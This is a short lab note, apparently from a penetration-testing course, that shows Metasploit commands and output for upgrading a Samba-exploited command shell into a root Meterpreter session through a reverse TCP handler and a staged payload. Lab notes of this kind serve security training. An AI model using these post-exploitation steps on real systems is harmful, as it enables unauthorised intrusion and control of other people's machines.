# Upgrading Command Shells To Meterpreter Shells

```bash
# Put the session background
msf6 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               192.154.30.2:42099 -> 192.154.3
                                         0.3:445 (192.154.30.3)

# Search module
msf6 exploit(linux/samba/is_known_pipename) > use shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 192.154.30.2
LHOST => 192.154.30.2

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.154.30.2:4433 
[*] Sending stage (1017704 bytes) to 192.154.30.3
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) >

# Metrpreter session created
msf6 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  2         shell cmd/unix                           192.154.30.2:42099
                                                     -> 192.154.30.3:445
                                                      (192.154.30.3)
  3         meterpreter x86/li  root @ demo.ine.loc  192.154.30.2:4433 -
            nux                 al                   > 192.154.30.3:5966
                                                     4 (192.154.30.3)



# Automatically upgrade
sessions -u 1
```